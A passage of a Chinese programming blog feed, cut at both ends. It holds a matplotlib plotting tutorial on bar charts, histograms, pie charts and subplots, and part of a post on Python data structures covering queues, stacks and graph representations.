class="string">包含所有柱子的高度值的列表</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">width</span></span><br><span class="line"><span class="string">每个柱子的宽度。可以指定一个固定值，那么所有的柱子都是一样的宽。或者设置一个列表，这样可以分别对每个柱子设定不同的宽度。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">align</span></span><br><span class="line"><span class="string">柱子对齐方式，有两个可选值：center和edge。center表示每根柱子是根据下标来对齐, edge则表示每根柱子全部以下标为起点，然后显示到下标的右边。如果不指定该参数，默认值是center。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">其他可选参数有：</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">color</span></span><br><span class="line"><span class="string">每根柱子呈现的颜色。同样可指定一个颜色值，让所有柱子呈现同样颜色；或者指定带有不同颜色的列表，让不同柱子显示不同颜色。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">edgecolor</span></span><br><span class="line"><span class="string">每根柱子边框的颜色。同样可指定一个颜色值，让所有柱子边框呈现同样颜色；或者指定带有不同颜色的列表，让不同柱子的边框显示不同颜色。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">linewidth</span></span><br><span class="line"><span class="string">每根柱子的边框宽度。如果没有设置该参数，将使用默认宽度，默认是没有边框。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">tick_label</span></span><br><span class="line"><span class="string">每根柱子上显示的标签，默认是没有内容。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">xerr</span></span><br><span class="line"><span class="string">每根柱子顶部在横轴方向的线段。如果指定一个固定值，所有柱子的线段将一直长；如果指定一个带有不同长度值的列表，那么柱子顶部的线段将呈现不同长度。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">yerr</span></span><br><span class="line"><span class="string">每根柱子顶端在纵轴方向的线段。如果指定一个固定值，所有柱子的线段将一直长；如果指定一个带有不同长度值的列表，那么柱子顶部的线段将呈现不同长度。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">ecolor</span></span><br><span class="line"><span class="string">设置 xerr 和 yerr 的线段的颜色。同样可以指定一个固定值或者一个列表。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">capsize</span></span><br><span class="line"><span class="string">这个参数很有趣, 对xerr或者yerr的补充说明。一般为其设置一个整数，例如 10。如果你已经设置了</span></span><br><span class="line"><span class="string">yerr 参数，那么设置 capsize 参数，会在每跟柱子顶部线段上面的首尾部分增加两条垂直原来线段的线段。对 xerr 参数也是同样道理。可能看说明会觉得绕，如果你看下图就一目了然了。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">error_kw</span></span><br><span class="line"><span class="string">设置 xerr 和 yerr 参数显示线段的参数，它是个字典类型。如果你在该参数中又重新定义了 ecolor 和 capsize，那么显示效果以这个为准。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">log</span></span><br><span class="line"><span class="string">这个参数，我暂时搞不懂有什么用。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">orientation</span></span><br><span class="line"><span class="string">设置柱子是显示方式。设置值为 vertical ，那么显示为柱形图。如果设置为 horizontal 条形图。不过 matplotlib 官网不建议直接使用这个来绘制条形图，使用barh来绘制条形图。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure><h2 id="条形图"><a href="#条形图" class="headerlink" title="条形图"></a>条形图</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 条形图</span></span><br><span class="line">x=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>]</span><br><span class="line">y=[<span class="number">3</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">plt.barh(x,y,align=<span class="string">'center'</span>,color=<span class="string">'red'</span>,tick_label=[<span class="string">"类1"</span>,<span class="string">'类2'</span>,<span class="string">'类3'</span>,<span class="string">'类4'</span>,<span class="string">'类5'</span>,<span class="string">'类6'</span>])</span><br><span class="line">plt.ylabel(<span class="string">"类别"</span>)</span><br><span class="line">plt.xlabel(<span class="string">"质量/kg"</span>)</span><br><span class="line">plt.show()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#正负条形图</span></span><br><span class="line">a = np.array([<span class="number">5</span>, <span class="number">20</span>, <span class="number">15</span>, <span class="number">25</span>, <span class="number">10</span>])</span><br><span class="line">b = np.array([<span class="number">10</span>, <span class="number">15</span>, <span class="number">20</span>, <span class="number">15</span>, <span class="number">5</span>])</span><br><span class="line"></span><br><span class="line">plt.barh(range(len(a)), a)</span><br><span class="line">plt.barh(range(len(b)), -b)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p><img src="myimages/python matplotlib 画图/output_7_0.png" alt="png"></p><p><img src="myimages/python matplotlib 画图/output_7_1.png" alt="png"></p><h2 id="直方图"><a href="#直方图" class="headerlink" title="直方图"></a>直方图</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 常规直方图</span></span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">boxweight=np.random.randint(<span class="number">0</span>,<span class="number">10</span>,<span class="number">100</span>)</span><br><span class="line">y=range(<span class="number">0</span>,<span class="number">11</span>,<span class="number">1</span>)</span><br><span class="line">plt.hist(boxweight,y,histtype=<span class="string">'bar'</span>,color=<span class="string">'g'</span>,alpha=<span class="number">.7</span>,label=<span class="string">'例子'</span>)</span><br><span class="line">plt.legend()</span><br><span class="line">plt.show()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#多类别直方图</span></span><br><span class="line"><span class="comment"># 分别生成10000 ， 5000 ， 2000 个值</span></span><br><span class="line">x_multi = [np.random.randn(n) <span class="keyword">for</span> n <span class="keyword">in</span> [<span class="number">10000</span>, <span class="number">5000</span>, <span class="number">2000</span>]]</span><br><span class="line"></span><br><span class="line">plt.hist(x_multi, <span class="number">10</span>, histtype=<span class="string">'bar'</span>,label=list(<span class="string">"ABC"</span>))</span><br><span class="line">plt.title(<span class="string">'多类型直方图'</span>)</span><br><span class="line"></span><br><span class="line">plt.legend()</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p><img src="myimages/python matplotlib 画图/output_9_0.png" alt="png"></p><p><img src="myimages/python matplotlib 画图/output_9_1.png" alt="png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">x：指定要绘制直方图的数据；</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">bins：指定直方图条形的个数；</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">range：指定直方图数据的上下界，默认包含绘图数据的最大值和最小值；</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">normed：是否将直方图的频数转换成频率；</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">weights：该参数可为每一个数据点设置权重；</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">cumulative：是否需要计算累计频数或频率；</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">bottom：可以为直方图的每个条形添加基准线，默认为0；</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">histtype：指定直方图的类型，默认为bar，除此还有’barstacked’, ‘step’, ‘stepfilled’；</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">align：设置条形边界值的对其方式，默认为mid，除此还有’left’和’right’；</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">orientation：设置直方图的摆放方向，默认为垂直方向；</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">rwidth：设置直方图条形宽度的百分比；</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">log：是否需要对绘图数据进行log变换；</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">color：设置直方图的填充色；</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">label：设置直方图的标签，可通过legend展示其图例；</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">stacked：当有多个数据时，是否需要将直方图呈堆叠摆放，默认水平摆放；</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">alpha：透明度，浮点数。</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure><h2 id="饼图"><a href="#饼图" class="headerlink" title="饼图"></a>饼图</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">labels = [<span class="string">u'大型'</span>,<span class="string">u'中型'</span>,<span class="string">u'小型'</span>,<span class="string">u'微型'</span>] <span class="comment">#定义标签</span></span><br><span class="line">sizes = [<span class="number">46</span>,<span class="number">253</span>,<span class="number">321</span>,<span class="number">66</span>] <span class="comment">#每块值</span></span><br><span class="line">colors = [<span class="string">'red'</span>,<span class="string">'yellowgreen'</span>,<span class="string">'lightskyblue'</span>,<span class="string">'yellow'</span>] <span class="comment">#每块颜色定义</span></span><br><span class="line">explode = (<span class="number">.05</span>,<span class="number">.05</span>,<span class="number">.05</span>,<span class="number">.05</span>) <span class="comment">#将某一块分割出来，值越大分割出的间隙越大</span></span><br><span class="line">patches,text1,text2 = plt.pie(sizes,</span><br><span class="line">                      explode=explode,</span><br><span class="line">                      labels=labels,</span><br><span class="line">                      radius=<span class="number">1</span>,              <span class="comment">#图例半径</span></span><br><span class="line">                      colors=colors,</span><br><span class="line">                      labeldistance = <span class="number">1.2</span>,   <span class="comment">#图例距圆心半径倍距离</span></span><br><span class="line">                      autopct = <span class="string">'%3.2f%%'</span>,   <span class="comment">#数值保留固定小数位</span></span><br><span class="line">                      shadow = <span class="keyword">True</span>,         <span class="comment">#阴影设置</span></span><br><span class="line">                      startangle =<span class="number">90</span>,        <span class="comment">#逆时针起始角度设置</span></span><br><span class="line">                      wedgeprops=dict(width=<span class="number">0.7</span>,edgecolor=<span class="string">'w'</span>),<span class="comment">#设置图形厚度以及边缘颜色</span></span><br><span class="line">                              </span><br><span class="line">                      pctdistance = <span class="number">.6</span>)      <span class="comment">#数值距圆心半径倍数距离</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#patches饼图的返回值，texts1饼图外label的文本，texts2饼图内部文本</span></span><br><span class="line">plt.legend()</span><br><span class="line">plt.show()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">size = <span class="number">0.3</span></span><br><span class="line">vals = np.array([[<span class="number">60.</span>, <span class="number">32.</span>], [<span class="number">37.</span>, <span class="number">40.</span>], [<span class="number">29.</span>, <span class="number">10.</span>]])</span><br><span class="line"></span><br><span class="line">cmap = plt.get_cmap(<span class="string">"tab20c"</span>)</span><br><span class="line">outer_colors = cmap(np.arange(<span class="number">3</span>)*<span class="number">4</span>)</span><br><span class="line">inner_colors = cmap(np.array([<span class="number">1</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">10</span>]))</span><br><span class="line"></span><br><span class="line">plt.pie(vals.sum(axis=<span class="number">1</span>), radius=<span class="number">1</span>-size, colors=outer_colors,autopct = <span class="string">'%2.1f%%'</span>,pctdistance = <span class="number">.7</span>,</span><br><span class="line">       wedgeprops=dict(width=size, edgecolor=<span class="string">'w'</span>))</span><br><span class="line"></span><br><span class="line">plt.pie(vals.flatten(), colors=inner_colors,autopct = <span class="string">'%2.1f%%'</span>,pctdistance = <span class="number">.85</span>,</span><br><span class="line">       wedgeprops=dict(width=size, edgecolor=<span class="string">'w'</span>))</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p><img src="myimages/python matplotlib 画图/output_12_0.png" alt="png"></p><p><img src="myimages/python matplotlib 画图/output_12_1.png" alt="png"></p><h1 id="图形分布"><a href="#图形分布" class="headerlink" title="图形分布"></a>图形分布</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#方法一</span></span><br><span class="line">t=np.arange(<span class="number">0.0</span>,<span class="number">2.0</span>,<span class="number">0.1</span>)</span><br><span class="line">s=np.sin(t*np.pi)</span><br><span class="line">plt.subplot(<span class="number">2</span>,<span class="number">2</span>,<span class="number">1</span>) <span class="comment">#要生成两行两列，这是第一个图plt.subplot('行','列','编号')</span></span><br><span class="line">plt.plot(t,s,<span class="string">'b--'</span>)</span><br><span class="line">plt.ylabel(<span class="string">'y1'</span>)</span><br><span class="line">plt.subplot(<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>) <span class="comment">#两行两列,这是第二个图</span></span><br><span class="line">plt.plot(<span class="number">2</span>*t,s,<span class="string">'r--'</span>)</span><br><span class="line">plt.ylabel(<span class="string">'y2'</span>)</span><br><span class="line">plt.subplot(<span class="number">2</span>,<span class="number">2</span>,<span class="number">3</span>)<span class="comment">#两行两列,这是第三个图</span></span><br><span class="line">plt.plot(<span class="number">3</span>*t,s,<span class="string">'m--'</span>)</span><br><span class="line">plt.subplot(<span class="number">2</span>,<span class="number">2</span>,<span class="number">4</span>)<span class="comment">#两行两列,这是第四个图</span></span><br><span class="line">plt.plot(<span class="number">4</span>*t,s,<span class="string">'k--'</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p><img src="myimages/python matplotlib 画图/output_14_0.png" alt="png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#方法二</span></span><br><span class="line">t=np.arange(<span class="number">0.0</span>,<span class="number">2.0</span>,<span class="number">0.1</span>)</span><br><span class="line">s=np.sin(t*np.pi)</span><br><span class="line">figure,ax=plt.subplots(<span class="number">2</span>,<span class="number">2</span>)</span><br><span class="line">ax[<span class="number">0</span>][<span class="number">0</span>].plot(t,s,<span class="string">'r*'</span>)</span><br><span class="line">ax[<span class="number">0</span>][<span class="number">1</span>].plot(t*<span class="number">2</span>,s,<span class="string">'b--'</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p><img src="myimages/python matplotlib 画图/output_15_0.png" alt="png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 坐标轴共享</span></span><br><span class="line"></span><br><span class="line">t=np.arange(<span class="number">0.0</span>,<span class="number">2.0</span>,<span class="number">0.1</span>)</span><br><span class="line">s=np.sin(t*np.pi)</span><br><span class="line"></span><br><span class="line">figure,ax=plt.subplots(<span class="number">2</span>,<span class="number">2</span>)</span><br><span class="line">ax[<span class="number">0</span>][<span class="number">0</span>].plot(t,s,<span class="string">'r*'</span>)</span><br><span class="line">ax[<span class="number">0</span>][<span class="number">1</span>].plot(t*<span class="number">2</span>,s,<span class="string">'b-'</span>)</span><br><span class="line">ax[<span class="number">1</span>][<span class="number">0</span>].plot(t,s,<span class="string">'r*'</span>)</span><br><span class="line">ax[<span class="number">1</span>][<span class="number">1</span>].plot(t,s*<span class="number">2</span>,<span class="string">'b-'</span>)</span><br><span class="line">plt.show()</span><br><span class="line"></span><br><span class="line">figure,ax=plt.subplots(<span class="number">2</span>,<span class="number">2</span>,sharex=<span class="string">"all"</span>,sharey=<span class="string">"all"</span>)</span><br><span class="line">ax[<span class="number">0</span>][<span class="number">0</span>].plot(t,s,<span class="string">'r*'</span>)</span><br><span class="line">ax[<span class="number">0</span>][<span class="number">1</span>].plot(t*<span class="number">2</span>,s,<span class="string">'b-'</span>)</span><br><span class="line">ax[<span class="number">1</span>][<span class="number">0</span>].plot(t,s,<span class="string">'r*'</span>)</span><br><span class="line">ax[<span class="number">1</span>][<span class="number">1</span>].plot(t,s*<span class="number">2</span>,<span class="string">'b-'</span>)</span><br><span class="line">plt.show()</span><br><span class="line"></span><br><span class="line">figure,ax=plt.subplots(<span class="number">2</span>,<span class="number">2</span>,sharex=<span class="string">"row"</span>)<span class="comment">#clo</span></span><br><span class="line">ax[<span class="number">0</span>][<span class="number">0</span>].plot(t,s,<span class="string">'r*'</span>)</span><br><span class="line">ax[<span class="number">0</span>][<span class="number">1</span>].plot(t*<span class="number">2</span>,s,<span class="string">'b-'</span>)</span><br><span class="line">ax[<span class="number">1</span>][<span class="number">0</span>].plot(t,s,<span class="string">'r*'</span>)</span><br><span class="line">ax[<span class="number">1</span>][<span class="number">1</span>].plot(t,s*<span class="number">2</span>,<span class="string">'b-'</span>)</span><br><span class="line">plt.show()</span><br><span class="line"></span><br><span class="line"><span class="comment">#共享个别图例坐标，如ax1和ax4</span></span><br><span class="line">figure,ax=plt.subplots(<span class="number">2</span>,<span class="number">2</span>)</span><br><span class="line">ax1=plt.subplot(<span class="number">221</span>)</span><br><span class="line">ax1.plot(t,s,<span class="string">'r*'</span>)</span><br><span class="line">ax[<span class="number">0</span>][<span class="number">1</span>].plot(t*<span class="number">2</span>,s,<span class="string">'b-'</span>)</span><br><span class="line">ax[<span class="number">1</span>][<span class="number">0</span>].plot(t,s,<span class="string">'r*'</span>)</span><br><span class="line">ax4=plt.subplot(<span class="number">224</span>,sharex=ax1)</span><br><span class="line">ax4.plot(t,s*<span class="number">2</span>,<span class="string">'b-'</span>)</span><br><span class="line"></span><br><span class="line">plt.show()</span><br><span class="line"></span><br><span class="line"><span class="comment">#将共享坐标抽子区间空隙去掉</span></span><br><span class="line">figure,ax=plt.subplots(<span class="number">2</span>,<span class="number">2</span>,sharex=<span class="string">"all"</span>,sharey=<span class="string">"all"</span>)</span><br><span class="line">figure.subplots_adjust(hspace=<span class="number">0</span>,wspace=<span class="number">0</span>)</span><br><span class="line">ax[<span class="number">0</span>][<span class="number">0</span>].plot(t,s,<span class="string">'r*'</span>)</span><br><span class="line">ax[<span class="number">0</span>][<span class="number">1</span>].plot(t*<span class="number">2</span>,s,<span class="string">'b-'</span>)</span><br><span class="line">ax[<span class="number">1</span>][<span class="number">0</span>].plot(t,s,<span class="string">'r*'</span>)</span><br><span class="line">ax[<span class="number">1</span>][<span class="number">1</span>].plot(t,s*<span class="number">2</span>,<span class="string">'b-'</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p><img src="myimages/python matplotlib 画图/output_16_0.png" alt="png"></p><p><img src="myimages/python matplotlib 画图/output_16_1.png" alt="png"></p><p><img src="myimages/python matplotlib 画图/output_16_2.png" alt="png"></p><p><img src="myimages/python matplotlib 画图/output_16_3.png" alt="png"></p><p><img src="myimages/python matplotlib 画图/output_16_4.png" alt="png"></p><h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h1><p>[1] <a href="https://matplotlib.org/api/_as_gen/matplotlib.pyplot.html#module-matplotlib.pyplot" target="_blank" rel="noopener">https://matplotlib.org/api/_as_gen/matplotlib.pyplot.html#module-matplotlib.pyplot</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>让数据结构pythonic</title>
      <link href="/2018/11/29/%E8%AE%A9%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84pythonic/"/>
      <url>/2018/11/29/%E8%AE%A9%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84pythonic/</url>
      
        <content type="html"><![CDATA[<p><img style="margin: auto;" src="/myimages/让数据结构pythonic/index.jpg" height="500" width="500"><br><a id="more"></a></p><blockquote><p>琢磨着也到了不大不小的年纪，恰逢今年寒假打算打一波数模美赛，负责编程，所以平时抽点时间，用这一个半月重新把数据结构的相关内容捡起来，同时把之前看得不系统的python数据处理相关的知识系统化。最后决定以一门新的语言——python,来学习或者说是温习一下数据结构（之前学的是c），以及python进行数据处理的相关内容。</p></blockquote><h1 id="线性表"><a href="#线性表" class="headerlink" title="线性表"></a>线性表</h1><p>看到一些文章和书籍上在线性表这块是自己定义类来实现的，甚至有些教材上直接在类中使用的是python自带的数据类型——列表。但是仔细思考一番线性表应该提供的一些操作，python内置的列表基本完全胜任，所以笔者认为，出于学习目的无可厚非，但要是真的在实践中这样做，不得不说有点画蛇添足。如果真的只是抱着学习线性表的构建的初衷也无可厚非，但感觉要学习还是直蹦底层的使用c或c++基于指针或者类的方式构建，收益更大。笔者使用python只是本着实用的目的，所以就不会依葫芦画瓢，我认为用python内置的列表对象及其方法，外加个迭代，就已经很好了。</p><h1 id="堆栈和队列"><a href="#堆栈和队列" class="headerlink" title="堆栈和队列"></a>堆栈和队列</h1><p>在python中没有与这两个数据结构类型直接关联的数据对象，但是有一些库可以提供队列的操作，如Queue库，里面集成了FIFO，LIFO的两种队列，其实也就是队列和堆栈没错了。所以本着pythonic的思想，完全可以不必要自己去实现堆栈，不过硬要实现起来，使用list对象，将其一些拓展操作封装成Stack，Queue，实现起来也比较方便。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> queue</span><br><span class="line"></span><br><span class="line">FIFO=queue.Queue(<span class="number">10</span>)    <span class="comment">#创建一个最大长度为10的FIFO队列,数据结构中的队列</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> FIFO.full():</span><br><span class="line">    FIFO.put(<span class="string">"hello"</span>)</span><br><span class="line">FIFO.qsize()</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> FIFO.empty():</span><br><span class="line">    item=FIFO.get()</span><br><span class="line">FIFO.qsize()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">LIFO=queue.LifoQueue(<span class="number">10</span>) <span class="comment">#创建一个最大长度为10的LIFO队列，数据结构中的栈</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> LIFO.full():</span><br><span class="line">    LIFO.put(<span class="string">"hello"</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> LIFO.full():</span><br><span class="line">    LIFO.put(<span class="number">3</span>)</span><br><span class="line">        </span><br><span class="line">FIFO.qsize()</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> LIFO.empty():</span><br><span class="line">    item1=LIFO.get()</span><br><span class="line">item2=LIFO.get()</span><br><span class="line">item2</span><br></pre></td></tr></table></figure><pre><code>&#39;hello&#39;</code></pre><h1 id="图"><a href="#图" class="headerlink" title="图"></a>图</h1><p>图这一块是比较的复杂，但是python的networkx库可以给我们构建图或者是基于图这个数据结构来进行分析带来了很大的便利。</p><h2 id="邻接列表表示法"><a href="#邻接列表表示法" class="headerlink" title="邻接列表表示法"></a>邻接列表表示法</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">a,b,c,d,e,f,g=range(<span class="number">7</span>)</span><br><span class="line">N=[</span><br><span class="line">    &#123;b:<span class="number">2</span>,c:<span class="number">1</span>,d:<span class="number">2</span>&#125;,                  <span class="comment">#a</span></span><br><span class="line">    &#123;c:<span class="number">4</span>,e:<span class="number">3</span>&#125;,                      <span class="comment">#b</span></span><br><span class="line">    &#123;d:<span class="number">8</span>&#125;,                          <span class="comment">#c</span></span><br><span class="line">    &#123;e,<span class="number">7</span>&#125;,                          <span class="comment">#d</span></span><br><span class="line">    &#123;f:<span class="number">5</span>&#125;,                          <span class="comment">#e</span></span><br><span class="line">    &#123;f:<span class="number">1</span>,c:<span class="number">6</span>&#125;,                      <span class="comment">#f</span></span><br><span class="line">    &#123;f:<span class="number">9</span>,c:<span class="number">7</span>&#125;                       <span class="comment">#g</span></span><br><span class="line">]</span><br><span class="line">N</span><br></pre></td></tr></table></figure><pre><code>[{1: 2, 2: 1, 3: 2}, {2: 4, 4: 3}, {3: 8}, {4, 7}, {5: 5}, {5: 1, 2: 6}, {5: 9, 2: 7}]</code></pre><h2 id="邻接矩阵表示法"><a href="#邻接矩阵表示法" class="headerlink" title="邻接矩阵表示法"></a>邻接矩阵表示法</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">a,b,c,d,e,f,g=range(<span class="number">7</span>)</span><br><span class="line">N=[[<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>],</span><br><span class="line">  [<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>],</span><br><span class="line">  [<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>],</span><br><span class="line">  [<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>],</span><br><span class="line">  [<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span 